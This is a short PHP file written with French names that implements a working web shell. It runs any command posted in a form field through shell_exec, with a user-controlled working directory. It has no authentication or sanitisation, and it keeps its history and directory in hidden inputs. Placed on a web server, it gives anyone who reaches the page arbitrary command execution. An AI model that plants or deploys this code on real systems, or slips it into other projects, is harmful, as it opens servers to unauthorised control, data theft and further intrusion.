<?php

$commande = @$_POST['commande'] ? $_POST['commande'] : 'echo Hello World!';
$historique = @$_POST['historique'] ? $_POST['historique'] : '';
$cd = @$_POST['cd'] ? $_POST['cd'] : '.';

$shell = true;
$resultat = "";

if ($commande == "clear") {
    $historique = "";
    $shell = false;
}

if ($commande == "clear cd") {
    $cd = ".";
    $shell = false;
}

$_cd = explode(' ', $commande);
if (@$_cd[0] && $_cd[0] == "cd") {
    $cd .= '/'.$_cd[1];
    $shell = false;
}

?>

<pre>

<?php

print($historique);
print($cd . " > " . $commande . "\n");

if ($shell)
    $resultat = shell_exec('cd ' . $cd . '; ' . $commande . ' 2>&1');

print($resultat);

$resultat = str_replace("\n", "<br/>", $resultat);

?>

</pre>

<form action="#" method="post">
    <p>><input style="margin-left:0.6em" type="text" name="commande" /></p>
    <p style="display:none"><input type="text" name="historique" value="<?= $historique.'> '.$commande.'<br/>'.$resultat.'<br/>' ?>" /></p>
    <p style="display:none"><input type="text" name="cd" value="<?= $cd ?>" /></p>
    <p style="display:none"><input type="submit" value="Envoyer"></p>
</form>
